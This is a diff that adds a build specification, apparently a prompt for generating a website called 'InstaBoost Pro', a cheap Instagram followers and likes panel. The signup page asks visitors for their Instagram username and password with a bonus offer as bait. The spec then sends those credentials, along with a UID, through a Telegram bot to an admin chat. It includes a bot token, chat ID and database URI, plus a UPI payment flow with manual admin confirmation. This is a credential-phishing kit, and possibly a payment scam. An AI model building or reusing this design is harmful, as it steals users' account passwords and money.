@@ -1,0 +1,168 @@
+**InstaBoost Pro — Full Prompt & Functional Flow**
+
+A new user visits the website: [https://instaboostpro.com](https://instaboostpro.com)
+
+**Homepage:**
+
+* A clean hero section with dark theme background (#122620), luxurious gold highlights (#d6ad60), and sans-serif modern font (Poppins/Inter).
+* Display a central **Welcome Bonus Card**: "Claim your free bonus — Get ₹10 now!"
+* Button: **Claim Now** (animated pulse glow)
+
+  * On click, redirect to `signup.html`
+
+**Sign Up Page:**
+
+* Clean form asking for:
+
+  * Instagram Username
+  * Password
+* Option to switch instantly to `login.html`
+* On submit:
+
+  * Store user in MongoDB
+  * Auto-generate a unique UID (UUID v4)
+  * Send credentials (username, password, UID) via Telegram bot message to Admin (ID: 6881713177)
+  * User redirected to `dashboard.html`
+
+**Dashboard:**
+
+* Displays:
+
+  * User’s UID with Copy button
+  * Available wallet balance (default ₹0)
+  * Welcome Bonus claim section (if not already claimed)
+
+    * If claimed within 24hrs: show countdown message
+  * Navigation buttons:
+
+    * Home
+    * Services
+    * Wallet
+    * Add Funds
+    * FAQ
+    * Policies
+* Hamburger menu on mobile with same options
+
+**Services Page:**
+
+* Clean service list table with categories:
+
+  * Followers
+  * Likes
+  * Comments
+  * Views
+* Service rows with:
+
+  * Name
+  * Rate per 1K (₹)
+  * Min, Max, Delivery Time
+  * View Button (eye icon)
+* On View button click:
+
+  * Open animated modal popup with:
+
+    * Service details
+    * Rate
+    * Min/Max
+    * Delivery Time
+    * **2 inputs: Price (₹) & Quantity**
+    * Real-time auto-calculation:
+
+      * Enter Price → Auto-calculate Quantity
+      * Enter Quantity → Auto-calculate Price
+    * Estimated delivery time based on quantity
+    * Confirm Order button
+
+      * On confirm:
+
+        * If sufficient wallet funds:
+
+          * Deduct funds
+          * Save order in MongoDB
+          * Show success message
+        * Else:
+
+          * Show red alert + vibration effect
+          * Redirect to `wallet.html`
+
+**Wallet Page:**
+
+* Display available wallet balance
+* Add Funds button
+* History of past orders
+
+**Payments Page:**
+
+* Show UPI QR image: [https://files.catbox.moe/gal4eh.jpg](https://files.catbox.moe/gal4eh.jpg)
+* Fields:
+
+  * UTR Number
+  * Amount
+  * UID
+* Submit button:
+
+  * Saves payment in MongoDB
+  * Sends message to Telegram bot with payment info and 2 inline buttons:
+
+    * Confirm
+    * Decline
+
+**Telegram Bot Logic:**
+
+* Token: `7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y`
+* Admin ID: `6881713177`
+* On new signup:
+
+  * Send message: New signup: username, password, UID
+* On payment submission:
+
+  * Send message: Payment UTR, Amount, UID
+  * Confirm button
+
+    * On confirm:
+
+      * Update payment status to confirmed
+      * Add amount to user’s wallet balance
+  * Decline button
+
+    * On decline:
+
+      * Update payment status to declined
+
+**.env Content:**
+
+```env
+MONGODB_URI=mongodb+srv://instaboost_user:YourStrongP%40ssw0rd@cluster0.tolxjiz.mongodb.net/instaboost
+TELEGRAM_BOT_TOKEN=7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y
+TELEGRAM_CHAT_ID=6881713177
+JWT_SECRET=SomeVeryStrongRandomSecret
+PORT=3000
+```
+
+**Animations & UI Behaviors:**
+
+* Button hover glow: gold shadow
+* Modal popups: fade + scale up
+* Wallet insufficient funds: red alert box + shake
+* Navbar hamburger menu slide-in on mobile
+
+**Services Pricing Examples:**
+
+* Followers:
+
+  * Indian: ₹4/1000
+  * US: ₹5/1000
+* Likes:
+
+  * Indian: ₹2/1000
+* Views: ₹1/1000
+* Comments: ₹8/1000
+
+**Page-to-Page Navigation:**
+
+* All pages linked via navbar and hamburger on mobile
+* User session with UID stored in localStorage
+* Wallet balance sync from MongoDB via API
+
+**Final Prompt Summary:**
+A luxury-styled, ultra-cheap SMM panel where users sign up, claim bonuses, buy services at ₹4/1000 with real-time price↔quantity calculators, manage wallet, and pay via UPI QR code. Admin manages payments via Telegram bot confirm/decline inline buttons.
